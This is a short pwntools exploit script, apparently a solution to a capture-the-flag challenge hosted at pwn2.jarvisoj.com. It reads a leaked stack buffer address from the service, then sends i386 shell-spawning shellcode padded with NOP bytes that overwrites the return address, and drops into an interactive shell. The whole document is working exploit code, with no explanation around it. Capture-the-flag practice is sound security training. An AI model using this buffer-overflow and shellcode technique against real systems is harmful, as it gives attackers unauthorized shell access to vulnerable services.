from pwn import *
p = remote('pwn2.jarvisoj.com',9877)

sh = asm(shellcraft.i386.sh())

p_buf = int(p.recv()[-10:-2],16)#the address of ebp-0x88 is printed out

p.sendline(sh+(0x8c-len(sh))*'\x90'+p32(p_buf))

p.interactive()
